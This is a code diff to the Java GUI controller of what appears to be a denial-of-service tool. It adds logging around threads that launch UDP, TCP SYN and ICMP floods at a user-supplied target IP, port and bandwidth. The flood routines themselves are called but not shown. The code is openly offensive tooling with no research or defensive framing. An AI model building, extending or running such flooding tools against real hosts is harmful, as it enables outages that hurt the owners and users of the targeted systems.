@@ -89,20 +89,34 @@ public class MainController {
         int mbps = Integer.parseInt(mbpsField.getText());
         int bytesPerSecond = mbps * 125000; // Convert Mbps to bytes per second
 
+        log("Starting attack with type: " + attackType + ", targetIp: " + targetIp + ", mbps: " + mbps + ", bytesPerSecond: " + bytesPerSecond);
+
         statusLabel.setText("Status: Attack in Progress");
         statusLabel.setStyle("-fx-text-fill: #2e7d32;");
 
         if ("UDP Flood".equals(attackType)) {
             log("Starting UDP flood attack...");
             int targetPort = Integer.parseInt(portField.getText());
-            new Thread(() -> jenkinsTool.udpFlood(targetIp, targetPort, bytesPerSecond)).start();
+            new Thread(() -> {
+                log("UDP flood thread started");
+                jenkinsTool.udpFlood(targetIp, targetPort, bytesPerSecond);
+                log("UDP flood thread ended");
+            }).start();
         } else if ("TCP SYN Flood".equals(attackType)) {
             int targetPort = Integer.parseInt(portField.getText());
             log("Starting TCP SYN flood attack...");
-            new Thread(() -> jenkinsTool.tcpSynFlood(targetIp, targetPort, bytesPerSecond)).start();
+            new Thread(() -> {
+                log("TCP SYN flood thread started");
+                jenkinsTool.tcpSynFlood(targetIp, targetPort, bytesPerSecond);
+                log("TCP SYN flood thread ended");
+            }).start();
         } else if ("ICMP Flood".equals(attackType)) {
             log("Starting ICMP flood attack...");
-            new Thread(() -> jenkinsTool.icmpFlood(targetIp, bytesPerSecond)).start();
+            new Thread(() -> {
+                log("ICMP flood thread started");
+                jenkinsTool.icmpFlood(targetIp, bytesPerSecond);
+                log("ICMP flood thread ended");
+            }).start();
         }
     }
 
